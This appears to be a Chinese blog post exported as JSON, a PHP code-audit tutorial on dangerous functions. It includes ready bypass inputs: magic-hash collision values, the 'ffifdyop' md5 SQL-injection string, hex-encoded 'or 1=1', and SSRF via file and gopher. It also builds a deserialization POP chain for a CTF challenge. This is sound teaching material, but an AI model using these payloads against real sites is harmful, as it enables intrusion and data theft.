#此函数是将上传的文件移动到新位置。\nmove_uploaded_file(file,newloc)\n\n参数 #\nfile：必需。规定要移动的文件。\nnewloc：必需。规定文件的新位置。\n\n本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。\n如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。\n如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。\n代码示例：\n$fileName = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/uploads/&#x27;.$_FILES[&#x27;file&#x27;][&#x27;name&#x27;];move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$fileName )\n\n这段代码就是直接接收上传的文件，没有进行任何的过滤，那么当我们上传getshell的后门时，就可以直接获取权限，可见这个函数是不能乱用的，即便要用也要将过滤规则完善好，防止上传不合法文件。\n文件删除 #unlink() #此函数用来删除文件。成功返回 TURE ，失败返回 FALSE。\nunlink(filename,context)\n\n参数 #\nfilename：必需。要删除的文件。\ncontext：可选。句柄环境。\n\n我们知道，一些网站是有删除功能的。比如常见的论坛网站，是有删除评论或者文章功能的。倘若网站没有对删除处做限制，那么就可能会导致任意文件删除（甚至删除网站源码）。\n代码示例：\n&lt;?php    $file = &quot;demo.txt&quot;;    if(unlink($file))&#123;        echo(&quot;$file have been deleted&quot;);    &#125;    else&#123;        echo(&quot;$file not exist?&quot;)    &#125;php&gt;\n\nsession_destroy() #在了解这个函数之前，我们需要先了解 PHP session。 PHP session 变量用于存储关于用户会话的信息。关于 sesson 的机制这里我就不再过于详细介绍。\nsession_destroy()函数用来销毁一个会话中的全部数据，但并不会重置当前会话所关联的全局变量，同时也不会重置会话 cookie\n代码示例：\n&lt;?php// 初始化会话。// 如果要使用会话，别忘了现在就调用：session_start();// 重置会话中的所有变量$_SESSION = array();// 如果要清理的更彻底，那么同时删除会话 cookie// 注意：这样不但销毁了会话中的数据，还同时销毁了会话本身if (ini_get(&quot;session.use_cookies&quot;)) &#123;    $params = session_get_cookie_params();    setcookie(session_name(), &#x27;&#x27;, time() - 42000,        $params[&quot;path&quot;], $params[&quot;domain&quot;],        $params[&quot;secure&quot;], $params[&quot;httponly&quot;]    );&#125;// 最后，销毁会话session_destroy();?&gt; \n\n变量覆盖 #extract() #此函数从数组中将变量导入到当前的符号表。其实作用就是给变量重新赋值，从而达到变量覆盖的作用。\nextract(array,extract_rules,prefix)\n\n参数 #\narray：必需。规定要使用的数组。\n\nextract_rules：可选。extract函数将检查每个键名是否为合法的变量名，同时也检查和符号中已经存在的变量名是否冲突，对不合法或者冲突的键名将会根据此参数的设定的规则来决定。\n\nEXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。\nEXTR_SKIP - 如果有冲突，不覆盖已有的变量。\nEXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。\nEXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。\nEXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。\nEXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。\nEXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。\nEXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。\n\n\nprefix：可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。\n\n\n代码示例：\n&lt;?php    $color = &quot;blue&quot;;    $one_array = array(&quot;color&quot; =&gt; &quot;red&quot;,        &quot;size&quot;  =&gt; &quot;medium&quot;,        &quot;name&quot; =&gt; &quot;dog&quot;);    extract($one_array);    echo &quot;$color, $size, $name&quot;;?&gt;执行结果——&gt;red, medium, dog\n\n在上述代码中，我们看到，本来我们定义的color是blue，输出的时候变成了red，本来我们没有定义size和name，可是却能输出这两个变量。\n还有一些在CTF比赛中出现过的用法，比如直接让你POST传参来改变某个变量的值。\n代码示例：\n&lt;?php    $name = &#x27;cat&#x27;;    extract($_POST);    echo $name;?&gt;\n\n参时如果我们POST传入name&#x3D;dog，那么页面将会回显dog，说明这个函数的使用让我们实现了变量的覆盖，改变了变量的值。\nparse_str() #此函数把查询到的字符串解析到变量中。\nparse_str(string,array)\n\n参数 #\nstring：必需。规定要解析的字符串。\narray：可选。规定存储变量的数组名称。该参数只是变量存储到数组中。\n\n代码示例:\n&lt;?php    parse_str(&quot;name=Ameng&amp;sex=boy&quot;,$a);    print_r($a);?&gt;执行结果——&gt;Array(    [name] =&gt; Ameng    [sex] =&gt; boy)\n\n上述代码是有array情况下的使用情况，那么如何实现变量的覆盖呢？如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。\n代码示例：\n&lt;?php    $name = &#x27;who&#x27;;    $age = &#x27;20&#x27;;    parse_str(&quot;name=Ameng&amp;age=21&quot;);    echo &quot;$name, $age&quot;;?&gt;执行结果——&gt;Ameng, 21\n\n通过上述代码，我们可以发现，变量name和age都发生了变化，被新的值覆盖了。这里我用的是 PHP 7.4.3 版本。发现这个函数的这个作用还是存在的，且没有任何危险提示。\nimport_request_variables() #此函数将GET&#x2F;POST&#x2F;Cookie变量导入到全局作用域中。从而能够达到变量覆盖的作用。\n版本要求：PHP 4 &gt;&#x3D; 4.1.0, PHP 5 &lt; 5.4.0\nbool import_request_variables ( string $types [, string $prefix ] )\n\n参数 #\ntypes：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。\nprefix：变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。\n\n代码示例：\n&lt;?php    $name = &#x27;who&#x27;;    import_request_variables(&#x27;gp&#x27;);    if($name == &#x27;Ameng&#x27;)&#123;        echo $name;    &#125;    else&#123;        echo &#x27;You are not Ameng&#x27;;    &#125;?&gt;\n\n如果什么变量也不传，那么页面将回显You are not Ameng如果通过GET或者POST传入name=Ameng那么页面就会回显Ameng\n可以见到此函数还是很危险的，没有修复方法，不使用就是最好的方法。所以在新版本的 PHP 中已经废弃了这个函数。\nforeach() #foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：\nforeach (array_expression as $value)    statementforeach (array_expression as $key =&gt; $value)    statement\n\n第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。\n第二种格式做同样的事，只是除了当前单元的键名也会在每次循环中被赋给变量 $key。\n那么这个函数如何实现变量的覆盖呢？我们来看个案例.\n代码示例：\n&lt;?php    $name = &#x27;who&#x27;;    foreach($_GET as $key =&gt; $value)    &#123;              $$key = $value;      &#125;      if($name == &quot;Ameng&quot;)&#123;        echo &#x27;You are right!&#x27;;    &#125;    else&#123;        echo &#x27;You are flase!&#x27;;    &#125;?&gt;\n\n那么执行结果是怎样的呢？当我们直接打开页面的时候它会输出You are false!,而当我们通过GET传参name=Ameng的时候，它会回显You are right!。那么这是为什么呢？我们来分析一下\n关键点就在于$$这种写法。这种写法称为可变变量。一个变量能够获取一个普通变量的值作为这个可变变量的变量名。当使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。这样就产生了变量覆盖漏洞，如上代码示例。其执行过程为$$key&#x3D;$name，最后赋值为$value，从而实现了变量覆盖。\n弱类型比较 #md5()函数和sha1()绕过 #关于这两个函数想必我们不陌生，无论是在实际代码审计中，还是在CTF比赛中，这些我们都是碰到过的函数。那么当我们遇到用这两个函数来判断的时候，如果绕过呢？\nPHP 在处理哈希字符串的时候，会使用!=或者==来对哈希值进行比较，它会把每一个0E开头的哈希值都解释为0，那么这个时候问题就来了，如果两个不同的值，经过哈希以后它们都变成了0E开头的哈希值，那么 PHP 就会将它们视作相等处理。那么0E开头的哈希值有哪些呢？\ns878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020\n\n来个简单的例子吧\n代码示例：\n&lt;?php    $a = $_GET[&#x27;a&#x27;];    $b = $_GET[&#x27;b&#x27;];    if($a != $b &amp;&amp; md5($a) == md5($b))&#123;        echo &#x27;这就是弱类型绕过&#x27;;    &#125;    else&#123;        echo &#x27;再思考一下&#x27;;    &#125;?&gt;\n\n从上面我给出的哪些值中，挑两个不同的值传入参数，就能看到相应的结果\n上面是md5()函数的绕过姿势，那么sha1()如何绕过呢？再来看一个简单的例子\n&lt;?php    $a = $_GET[&#x27;a&#x27;];    $b = $_GET[&#x27;b&#x27;];    if(isset($a,$b))&#123;        if(sha1($a) === sha1($b))&#123;            echo &#x27;nice!!!&#x27;;        &#125;        else&#123;            echo &#x27;Try again!&#x27;;        &#125;    &#125;?&gt;\n\n当我们传入a[]=1&amp;b[]=2的时候，虽然它会给出警告，说我们应该传入字符串而不应该是数组，但是它还是输出了nice!!!，所以我们完全可以用数字来绕过sha1()函数的比较。\nis_numeric()绕过 #我们先来了解一下这个函数。此函数是检测变量是否为数字或者数字字符串\nis_numeric( mixed $var) : bool\n\n如果var是数字或者数字字符串那么就返回TRUE，否则就返回FALSE。那么这里说的绕过是什么姿势呢？是十六进制。我们先来看一个简单的例子。\n代码示例：\n&lt;?php    $a = is_numeric(&#x27;0x31206f722031&#x27;);    if($a)&#123;        echo &#x27;It meets my requirement&#x27;;    &#125;    else&#123;        echo &#x27;Try again&#x27;;    &#125;?&gt;执行结果——&gt;It meets my requirement\n\n这里说一下0x31206f722031这个是什么？这个是or 1=1的十六进制，从这里可以看出，如果某处使用了此函数，并将修饰后的变量带入数据库查询语句中，那么我们就能利用此漏洞实现sql注入。同样的，这个漏洞再CTF比赛中也是很常见的。\nin_array()绕过 #此函数用来检测数组中是否存在某个值。\nin_array( mixed $needle, array $haystack[, bool $strict = FALSE] ) : bool\n\n参数 #\nneedle：带搜索的值(区分大小写)。\nhaystack：带搜索的数组。\nstrict：若此参数的值为TRUE，那么in_array()函数将会检查needle的类型是否和haystack中的类型相同。\n\n有时候我们再传入一个数组的时候，代码可能会过滤某些敏感字符串，但是我们又需要传入这样的字符串，那么我们应该如何绕过它的检测呢？\n&lt;?php    $myarr = array(&#x27;Ameng&#x27;);    $needle = 0;    if(in_array($needle,$myarr))&#123;        echo &quot;It&#x27;s in array&quot;;    &#125;    else&#123;        echo &quot;not in array&quot;;    &#125;?&gt;\n\n上面代码示例执行的结果会是什么呢？从简单的逻辑上分析。0是不存在要搜索的数组中的，所以理论上，应该是输出not in array，但是实际却输出了It&#39;s in array。这是为什么呢？原因就在于PHP的默认类型转换。这里我们第三个参数并没有设置为true那么默认就是非严格比较，所以在数字与字符串进行比较时，字符串先被强制转换成数字，然后再进行比较。并且因为某些类型转换正在发生，就会导致发生数据丢失，并且都被视为相同。所以归根到底还是非严格比较导致的问题。所以再遇到这个函数用来变量检测的时候，我们可以看看第三个参数是否开启，若未开启，则存在数组绕过。\nXSS #在这里首先你要对XSS的基本原理要知道。PHP中一下这些函数之所以会出现XSS的漏洞情况，主要还是没有对输出的变量进行过滤。\nprint() #代码示例：\n&lt;?php    $str = $_GET[&#x27;x&#x27;];    print($str);?&gt;\n\n\nprint_r() #代码示例：\n&lt;?php    $str = $_GET[&#x27;x&#x27;];    print_r($str);?&gt;\n\n\necho() #代码示例：\n&lt;?php    $str = $_GET[&#x27;x&#x27;];    echo &quot;$str&quot;;?&gt;\n\n我们传入相应参数，执行结果如下：\n\nprintf() #代码示例：\n&lt;?php    $str = $_GET[&#x27;x&#x27;];    printf($str);?&gt;\n\n执行结果和上面相同，我就不再贴图片了。\nsprintf() #代码示例：\n&lt;?php    $str = $_GET[&#x27;x&#x27;];    $a = sprintf($str);    echo &quot;$a&quot;;?&gt;\n\ndie() #此函数输出一条信息，并退出当前脚本。\n代码示例：\n&lt;?php    $str = $_GET[&#x27;x&#x27;];    die($str);?&gt;\n\nvar_dump() #此函数打印变量的相关信息，用来显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开之，通过缩进显示其结构。\n代码示例：\n&lt;?php    $str = $_GET[&#x27;x&#x27;];    $a = array($str);    var_dump($a);?&gt;\n\nvar_export() #此函数输出或者返回一个变量的字符串表示。它返回关于传递给该函数的变量的结构信息，和var_dump类似，不同的是其返回的表示是合法的 PHP 代码。\n代码示例：\n&lt;?php    $str = $_GET[&#x27;x&#x27;];    $a = array($str);    var_export($a);?&gt;\n\n\nPHP黑魔法 #这里大部分函数的使用已经在上面详细介绍过了，这里我就针对每一种函数大概介绍一下其主要存在的利用方法。\nmd5() #md5()函数绕过sql注入。我们来看一个例子。\n代码示例：\n$password=$_POST[&#x27;password&#x27;];$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;$result=mysqli_query($link,$sql);if(mysqli_num_rows($result)&gt;0)&#123;    echo &#x27;flag is :&#x27;.$flag;&#125;else&#123;    echo &#x27;密码错误!&#x27;;&#125;\n\n这里提交的参数通过md5函数处理，然后再进入SQL查询语句，所以常规的注入手段就不行了，那么如果md5后的转换成字符串格式变成了&#39;or&#39;xxxx的格式，不就可以注入了么。md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c\n转成字符串为&#39;or&#39;6xxx\neval() #在执行命令时，可使用分号构造处多条语句。类似这种。\n&lt;?php    $cmd = &quot;echo &#x27;a&#x27;;echo &#x27;--------------&#x27;;echo &#x27;b&#x27;;&quot;;    echo eval($cmd);?&gt;\n\nereg() #存在%00截断，当遇到使用此函数来进行正则匹配时，我们可以用%00来截断正则匹配，从而绕过正则。\nstrcmp() #这个在前面介绍过，就是数组绕过技巧。\ncurl_setopt() #存在ssrf漏洞。\n代码示例：\n&lt;?php    $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $_GET[&#x27;Ameng&#x27;]);    #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);    curl_setopt($ch, CURLOPT_HEADER, 0);    #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);    curl_exec($ch);    curl_close($ch);?&gt;\n\n使用file协议进行任意文件读取\n\n除此之外还有dict协议查看端口信息。gopher协议反弹shell利用等。\npreg_replace() #此函数前面详细介绍过，&#x2F;e模式下的命令执行。\nurldecode() #url二次编码绕过。\n代码示例：\n&lt;?php    $name = urldecode($_GET[&#x27;name&#x27;]);    if($name = &quot;Ameng&quot;)&#123;        echo &quot;Plase~&quot;;    &#125;    else&#123;        echo &quot;sorry&quot;;    &#125;?&gt;\n\n将Ameng进行二次url编码，然后传入即可得到满足条件。\nfile_get_contents() #常用伪协议来进行绕过。\nparse_url() #此函数主要用于绕过某些过滤，先简单了解一下函数的基本用法。\n代码示例：\n&lt;?php    $url = &quot;http://www.jlx-love.com/about&quot;;    $parts = parse_url($url);    print_r($parts);?&gt;执行结果——&gt;Array     (     [scheme] =&gt; http     [host] =&gt; www.jlx-love.com         [path] =&gt; /about     )\n\n可以看到这个函数把我们的变量值拆分成一个几个部分。那么绕过过滤又是说的哪回事呢？其实就是当我们在浏览器输入url时，那么就会将url中的\\转换为&#x2F;，从而就会导致parse_url的白名单绕过。\n反序列化漏洞 #简介 #在了解一些函数之前，我们首先需要了解什么是序列化和反序列化。\n序列化：把对象转换为字节序列的过程成为对象的序列化。\n反序列化：把字节序列恢复为对象的过程称为对象的反序列化。\n归根到底，就是将数据转化成一种可逆的数据结构，逆向的过程就是反序列化。\n在 PHP 中主要就是通过serialize和unserialize来实现数据的序列化和反序列化。\n那么漏洞是如何形成的呢？\nPHP 的反序列化漏洞主要是因为未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而就可以导致各种危险行为。\n那么我们先来看一看序列化后的数据格式是怎样的，了解了序列化后的数据，我们才能更好的理解和利用漏洞。所以我们来构造一段序列化的值。\n代码示例：\n&lt;?php    class Ameng&#123;    public $who = &quot;Ameng&quot;;    &#125;    $a = serialize(new Ameng);    echo $a;?&gt;执行结果——&gt;O:5:&quot;Ameng&quot;:1:&#123;s:3:&quot;who&quot;;s:5:&quot;Ameng&quot;;&#125;\n\n\n这里还要补充一点，就是关于变量的分类，变量的类别有三种：\n\npublic：正常操作，在反序列化时原型就行。\nprotected：反序列化时在变量名前加上%00*%00。\nprivate：反序列化时在变量名前加上%00类名%00。\n\n序列化我们知道了是个什么格式，那么如何利用反序列化来触发漏洞进行利用呢？\n__wakeup() #在我们反序列化时，会先检查类中是否存在__wakeup()如果存在，则执行。但是如果对象属性个数的值大于真实的属性个数时就会跳过__wakeup()执行__destruct()。\n影响版本：\nPHP5 &lt; 5.6.25\nPHP7 &lt; 7.0.10\n代码示例：\n&lt;?php    header(&quot;Content-Type: text/html; charset=utf-8&quot;);    class Ameng&#123;         public $name=&#x27;1.php&#x27;;         function __destruct()&#123;             echo &quot;destruct执行&lt;br&gt;&quot;;            echo highlight_file($this-&gt;name, true);         &#125;                  function __wakeup()&#123;             echo &quot;wakeup执行&lt;br&gt;&quot;;            $this-&gt;name=&#x27;1.php&#x27;;         &#125;     &#125;    $data = &#x27;O:5:&quot;Ameng&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;2.php&quot;;&#125;&#x27;;    unserialize($data);?&gt;\n\n执行结果：\n\n__sleep() #__sleep()函数刚好与__waeup()相反，前者是在序列化一个对象时被调用，后者是在反序列化时被调用。那么该如何利用呢？我们看看代码。\n&lt;?php    header(&quot;Content-Type: text/html; charset=utf-8&quot;);    class Ameng&#123;         public $name=&#x27;1.php&#x27;;                 public function __construct($name)&#123;        $this-&gt;name=$name;    &#125;                function __sleep()&#123;            echo &quot;sleep()执行&lt;br&gt;&quot;;            echo highlight_file($this-&gt;name, true);        &#125;                function __destruct()&#123;            echo &quot;over&lt;br&gt;&quot;;        &#125;                function __wakeup()&#123;             echo &quot;wakeup执行&lt;br&gt;&quot;;                 &#125;     &#125;    $a = new Ameng(&quot;2.php&quot;);    $b = serialize($a);?&gt;\n\n执行结果：\n\n__destruct() #这个函数的作用其实在上面的例子中已经显示了，就是在对象被销毁时调用，倘若这个函数中有命令执行之类的功能，我们完全可以利用这一点来进行漏洞的利用，得到自己想要的结果。\n__construct() #这个函数的作用在__sleep()也是体现了的，这个函数就是在一个对象被创建时会调用这个函数，比如我在__sleep()中用这个函数来对变量进行赋值。\n__call() #此函数用来监视一个对象中的其他方法。当你尝试调用一个对象中不存在的或者被权限控制的方法，那么__call就会被自动调用\n代码示例：\n&lt;?php    header(&quot;Content-Type: text/html; charset=utf-8&quot;);    class Ameng&#123;                  public function __call($name,$args)&#123;            echo &quot;&lt;br&gt;&quot;.&quot;call执行失败&quot;;        &#125;                public static function __callStatic($name,$args)&#123;            echo &quot;&lt;br&gt;&quot;.&quot;callStatic执行失败&quot;;        &#125;    &#125;    $a = new Ameng;    $a-&gt;b();    Ameng::b();?&gt;\n\n执行结果：\n\n__callStatic() #这个方法是 PHP5.3增加的新方法。主要是调用不可见的静态方法时会自动调用。具体使用在上面代码示例和结果可见。那么这两个函数有什么值得我们关注的呢？想一想，倘若这两个函数中有命令执行的函数，那么我们调用对象中不存在方法时就可以调用这两个函数，这不就达到我们想要的目的了。\n__get() #一般来说，我们总是把类的属性定义为private。但有时候我们对属性的读取和赋值是非常频繁，这个时候PHP就提供了两个函数来获取和赋值类中的属性。\nget方法用来获取私有成员属性的值。\n代码示例：\n//__get()方法用来获取私有属性public function __get($name)&#123;return $this-&gt;$name;&#125;\n\n参数 #\n$name：要获取成员属性的名称。\n\n__set() #此方法用来给私有成员属性赋值。\n代码示例：\n//__set()方法用来设置私有属性public function __set($name,$value)&#123;$this-&gt;$name = $value;&#125;\n\n参数 #\n$name：要赋值的属性名。\n$value：给属性赋值的值。\n\n__isset() #这个函数是当我们对不可访问属性调用isset()或者empty()时调用。\n在这之前我们要先了解一下isset()函数的使用。isset()函数检测某个变量是否被设置了。所以这个时候问题就来了，如果我们使用这个函数去检测对象里面的成员是否设定，那么会发生什么呢？\n若对象的成员是公有成员，那没什么问题。倘若对象的成员是私有成员，那这个函数就不行了，人家根本就不允许你访问，你咋能检测人家是否设定了呢？那我们该怎么办？这个时候我们可以在类里面加上__isset()方法，接下来就可以使用isset()在对象外面访问对象里面的私有成员了。\n代码示例：\n&lt;?php    header(&quot;Content-Type: text/html; charset=utf-8&quot;);    class Ameng&#123;          private $name;                public function __construct($name=&quot;&quot;)&#123;            $this-&gt;name = $name;        &#125;                public function __isset($content)&#123;            echo &quot;当在类外面调用isset方法时，那么我就会执行！&quot;.&quot;&lt;br&gt;&quot;;            echo isset($this-&gt;$content);        &#125;    &#125;    $ameng = new Ameng(&quot;Ameng&quot;);    echo isset($ameng-&gt;name);?&gt;\n\n执行结果：\n\n__unset() #这个方法基本和__insset情况一致，都是在类外访问类内私有成员时要调用这个函数，基本调用的方法和上面一致。\n代码示例：\n&lt;?php    header(&quot;Content-Type: text/html; charset=utf-8&quot;);    class Ameng&#123;          private $name;                public function __construct($name=&quot;&quot;)&#123;            $this-&gt;name = $name;        &#125;                public function __unset($content)&#123;            echo &quot;当在类外面调用unset方法时，那么我就会执行！&quot;.&quot;&lt;br&gt;&quot;;            echo isset($this-&gt;$content);        &#125;    &#125;    $ameng = new Ameng(&quot;Ameng&quot;);    unset($ameng-&gt;name);?&gt;\n\n执行结果：\n\ntoString() #此函数是将一个对象当作一个字符串来使用时，就会自动调用该方法，且在该方法中，可以返回一定的字符串，来表示该对象转换为字符串之后的结果。\n通常情况下，我们访问类的属性的时候都是$实例化名称-&gt;属性名这样的格式去访问，但是我们不能直接echo去输出对象，可是当我们使用__tostring()就可以直接用echo来输出了。\n代码示例：\n&lt;?php    header(&quot;Content-Type: text/html; charset=utf-8&quot;);    class Ameng&#123;        public $name;        private $age;        function __construct($name,$age)&#123;            $this-&gt;name = $name;            $this-&gt;age = $age;        &#125;        public function __toString()&#123;            return $this-&gt;name . $this-&gt;age . &#x27;岁了&#x27;;        &#125;    &#125;    $ameng = new Ameng(&#x27;Ameng&#x27;,3);    echo $ameng;?&gt;\n\n执行结果：\nAmeng3岁了\n\n__invoke() #当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用。\n版本要求：\nPHP &gt; 5.3.0\n代码示例：\n&lt;?php    header(&quot;Content-Type: text/html; charset=utf-8&quot;);    class Ameng&#123;        public $name;        private $age;        function __construct($name,$age)&#123;            $this-&gt;name = $name;            $this-&gt;age = $age;        &#125;        public function __invoke()&#123;           echo &#x27;你用调用函数的方式调用了这个对象，所以我起作用了&#x27;;        &#125;    &#125;    $ameng = new Ameng(&#x27;Ameng&#x27;,3);    $ameng();?&gt;执行结果——&gt;你用调用函数的方式调用了这个对象，所以我起作用\n\npop链的构造 #思路 #\n寻找位点（unserialize函数—&gt;变量可控）\n正向构造（各种方法）\n反向推理（从要完成的目的出发，反向推理，最后找到最先被调用的位置处）\n\n来看一个简单的例子(HECTF)：\n&lt;?phpclass Read &#123;    public $var;    public $token;    public $token_flag;    public function __construct() &#123;          $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));         $this-&gt;token =&amp;$this-&gt;token_flag;    &#125;    public function __invoke()&#123;        $this-&gt;token_flag = md5(rand(1,10000));                if($this-&gt;token === $this-&gt;token_flag)        &#123;            echo &quot;flag&#123;**********&#125;&quot;;        &#125;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct()    &#123;        echo $this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()    &#123;        $this-&gt;str[&#x27;str&#x27;]-&gt;source;    &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        $func = $this-&gt;params;        return $func();    &#125;&#125;if(isset($_GET[&#x27;chal&#x27;]))&#123;    $chal = unserialize($_GET[&#x27;chal&#x27;]);&#125;\n\n我们要拿到flag，在__invoke()函数，当对象被当作函数调用时，那么就会自动执行该函数。所以我们要做的就是用函数来调用对象。\n那么我们首先找到起点，就是unserialize函数的变量，因为这个变量是我们可控的，但是肯定是过滤了一些常见的协议，那些协议我在上面也简单介绍过用法。\n通过函数的过程搜索，我们能够看到preg_match第二个参数会被当作字符串处理，在类Test中，我们可以给$func赋值给Read对象。\n那么我们可以构造如下pop链\n&lt;?php     ··········    $read = new Read();    $show = new Show();    $test = new Test();        $read-&gt;token = &amp;$read-&gt;token_flag;    $test-&gt;params = $read;    $show-&gt;str[&#x27;str&#x27;] = $test;    $show-&gt;source = $show;    echo serialize($show);?&gt;\n\n给个图总结一下：\n\nphar与反序列化 #简介 #PHAR（”PHP archive”）是PHP里类似JAR的一种打包文件，在PHP &gt; 5.3版本中默认开启。其实就是用来打包程序的。\n文件结构 #\na stub：xxx&lt;?php xxx;__HALT_COMPILER();?&gt;前面内容不限，后面必须以__HALT_COMPILER();?&gt;结尾，否则phar扩展无法将该文件识别为phar文件。\n\n官方手册\nphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。\n\n\n\n实验 #前提：将php.ini中的phar.readonly选项设置为off，不然无法生成phar文件。\nphar.php： #&lt;?php    class TestObject &#123;    &#125;    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub    $o = new TestObject();    $o -&gt; data=&#x27;Hello I am Ameng&#x27;;    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;\n\n在我们访问之后，会在当前目录下生成一个phar.phar文件，如下图所示。\n\n然后查看文件的十六进制形式，我们就可以看到meta-data是以序列化的形式存储。既然存在序列化的数据，那肯定有序列化的逆向操作反序列化。那么这里在PHP中存在很多通过phar://伪协议解析phar文件时，会将meta-data进行反序列化。可用函数如下图\n\nAmeng.php #&lt;?phpclass TestObject&#123;    function __destruct()    &#123;        echo $this -&gt; data;   // TODO: Implement __destruct() method.    &#125;&#125;include(&#x27;phar://phar.phar&#x27;);?&gt;\n\n执行结果：\n\n这里简单介绍一下phar的大致应用，更详细可以参考seebug\n\n(opens new window)。\n其他一些总结 #basename() #此函数返回路径中的文件名的一部分(后面)\nbasename(path,suffix)\n\n参数 #\npath：必需。规定要检查的路径。\nsuffix：可选。规定文件的扩展名。\n\n代码示例：\n&lt;?php    $path = &quot;index.php/test.php&quot;;    echo basename($path);?&gt;执行结果——&gt;test.php\n\n此函数还有一个特点，就是会去掉文件名的非ASCII码值。\n代码示例：\n&lt;?php    $path = $_GET[&#x27;x&#x27;];    print_r(basename($path));?&gt;\n\n我们通过 url 传入参数x=index.php/config.php/%ff\n结果如下：\n\n我们看到，%ff直接没了，而是直接输出前面的的文件名，这个可以用来绕过一些正则匹配。原因就在于%ff在通过 url 传参时会被 url 解码，解码成了不可见字符，满足了basename函数对文件名的非ASCII值去除的特点，从而被删掉。\n","categories":["Web安全"],"tags":["代码审计","基础知识"]},{"title":"涉网犯罪打击武器军火库","url":"//fuckBC/","content":"\n      \n        \n      \n      \n        \n          \n          \n            Hey, password is required here.\n          \n        \n        \n      \n    \n    ","categories":["Web安全"],"tags":["涉网犯罪打击,0day"]}]